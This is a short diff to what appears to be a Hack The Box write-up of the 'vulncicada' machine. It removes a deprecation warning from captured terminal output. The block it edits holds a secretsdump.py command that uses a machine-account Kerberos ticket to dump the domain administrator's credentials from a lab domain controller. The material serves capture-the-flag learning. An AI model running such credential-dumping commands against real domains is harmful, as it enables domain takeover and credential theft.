@@ -564,8 +564,7 @@ The machine account itself can’t be used to obtain an interactive shell, but t
 ```shell
 ┌─[us-dedivip-1]─[10.10.14.74]─[deesick@htb-ovdhvrjiyt]─[~/HTB/vulncicada]
 └──╼ [★]$ KRB5CCNAME=dc-jpq225.ccache secretsdump.py -k -no-pass cicada.vl/dc-jpq225\$@dc-jpq225.cicada.vl -just-dc-user administrator
-/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
-  import pkg_resources
+
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
